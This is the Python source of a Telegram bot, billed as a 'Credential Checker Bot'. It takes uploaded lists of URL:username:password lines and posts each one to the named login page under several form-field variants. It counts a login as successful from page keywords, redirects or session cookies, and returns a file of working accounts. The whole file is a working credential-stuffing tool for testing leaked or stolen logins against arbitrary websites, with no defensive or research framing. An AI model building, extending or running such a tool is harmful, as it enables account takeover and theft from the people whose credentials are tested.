import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
from datetime import datetime

# Fix for Pyrogram on Python 3.14+
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InputMediaDocument
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Security Middleware ---
def is_admin(user_id):
    if not ALLOWED_USERS:
        return False
    return user_id in ALLOWED_USERS

# --- Flask Health Server (Keep Alive) ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot is running and healthy.", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask health server on port {port}")
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Credential Parser ---
def parse_credential_line(line):
    """
    Parse line in format: URL:email/username:password
    Returns: (url, username, password) or None if invalid
    """
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Format: URL:username:password
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    # First part is URL, last is password, middle is username
    url = parts[0]
    password = ':'.join(parts[2:])  # Password might contain colons
    username = ':'.join(parts[1:-1])  # Username might contain colons
    
    # Ensure URL has protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    return (url, username, password)

# --- Credential Checking Logic ---
async def check_credential(session, url, username, password):
    """
    Attempts to validate credentials against the target URL.
    Returns: (is_valid, message)
    """
    target_info = f"Target: {url} | User: {username}"
    
    try:
        payload = {
            'username': username,
            'password': password
        }
        
        # Try common field name variations
        payloads_to_try = [
            {'username': username, 'password': password},
            {'email': username, 'password': password},
            {'user': username, 'password': password},
            {'login': username, 'password': password},
            {'Username': username, 'Password': password},
        ]
        
        for payload in payloads_to_try:
            try:
                async with session.post(
                    url, 
                    data=payload, 
                    allow_redirects=True,
                    timeout=15
                ) as response:
                    
                    status = response.status
                    text = await response.text()
                    final_url = str(response.url)
                    
                    # Success indicators
                    success_indicators = [
                        'dashboard', 'welcome', 'profile', 'account', 
                        'logout', 'home', 'main', 'panel', 'admin',
                        'success', 'authenticated', 'logged in'
                    ]
                    
                    # Failure indicators
                    failure_indicators = [
                        'invalid', 'incorrect', 'error', 'failed',
                        'wrong', 'denied', 'unauthorized', 'login again',
                        'try again', 'not found', 'does not exist'
                    ]
                    
                    text_lower = text.lower()
                    
                    # Check for success
                    has_success = any(ind in text_lower for ind in success_indicators)
                    has_failure = any(ind in text_lower for ind in failure_indicators)
                    
                    # URL changed (redirected to dashboard)
                    url_changed = final_url != url and '/login' not in final_url.lower()
                    
                    # Cookies or tokens received
                    has_session = any(cookie in str(response.cookies) for cookie in ['session', 'token', 'auth', 'id'])
                    
                    if (status == 200 and has_success and not has_failure) or url_changed or has_session:
                        return (True, f"Success | Status: {status} | Final URL: {final_url[:50]}...")
                    
            except Exception:
                continue
        
        return (False, f"Failed | Status: {status} | No valid response pattern found")
        
    except asyncio.TimeoutError:
        return (False, "Timeout - No response")
    except aiohttp.ClientError as e:
        return (False, f"Connection Error: {str(e)[:50]}")
    except Exception as e:
        return (False, f"Error: {str(e)[:50]}")

# --- Main Processing Function ---
async def process_credentials(client: Client, message: Message, file_path: str):
    """Process the credential file and send results"""
    chat_id = message.chat.id
    
    # Read file
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error reading file: {str(e)}")
        return
    
    # Parse credentials
    credentials = []
    for line_num, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((line_num, parsed[0], parsed[1], parsed[2]))
    
    total = len(credentials)
    
    if total == 0:
        await message.reply_text("❌ No valid credentials found in file.\nFormat should be: URL:username:password")
        return
    
    await message.reply_text(f"🔍 Found {total} credentials to check. Starting validation...")
    
    valid_results = []
    checked = 0
    last_progress = 0
    
    # Create session
    connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for line_num, url, username, password in credentials:
            is_valid, msg = await check_credential(session, url, username, password)
            
            if is_valid:
                valid_results.append(f"{url}:{username}:{password}")
                logger.info(f"✅ VALID: {url} | {username}")
            
            checked += 1
            progress = int((checked / total) * 100)
            
            # Send progress every 10%
            if progress >= last_progress + 10:
                last_progress = (progress // 10) * 10
                await message.reply_text(f"⏳ Progress: {last_progress}% ({checked}/{total} checked)\n✅ Valid found so far: {len(valid_results)}")
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(0.5)
    
    # Send final results
    await message.reply_text(f"✅ **Check Complete!**\n\n📊 Total Checked: {total}\n✅ Valid Found: {len(valid_results)}\n❌ Invalid: {total - len(valid_results)}")
    
    if valid_results:
        # Save to file
        result_file = f"valid_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(result_file, 'w') as f:
            f.write('\n'.join(valid_results))
        
        # Send file
        await message.reply_document(result_file, caption=f"📁 Valid Credentials ({len(valid_results)} accounts)")
        
        # Cleanup
        os.remove(result_file)
    else:
        await message.reply_text("❌ No valid credentials found.")
    
    # Cleanup original file
    os.remove(file_path)

# --- Bot Handlers ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return

    await message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can validate credentials from a text file.\n\n"
        "**Format:**\n"
        "`URL:email:password` or `URL:username:password`\n\n"
        "**Examples:**\n"
        "`https://example.com/login:user@email.com:pass123`\n"
        "`site.com/login:myuser:mypass`\n\n"
        "**How to use:**\n"
        "1. Send a `.txt` file with your list.\n"
        "2. I will check each line and return valid credentials.\n\n"
        "⚠️ **Note:** Progress updates every 10%"
    )

@app.on_message(filters.document)
async def handle_document(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    
    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        await message.reply_text("❌ Invalid file type. Please send a `.txt` file only.")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Failed to download file: {str(e)}")
        return
    
    await message.reply_text("📥 File received. Starting validation process...")
    
    # Run processing
    await process_credentials(client, message, file_path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def private_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("⚠️ Send me a `.txt` file with credentials or use /start for help.")

# --- Main Execution ---
if __name__ == "__main__":
    # Start Flask in a separate daemon thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Flask health server started.")
    logger.info("Starting Pyrogram Client...")
    
    # Run the bot
    app.run()
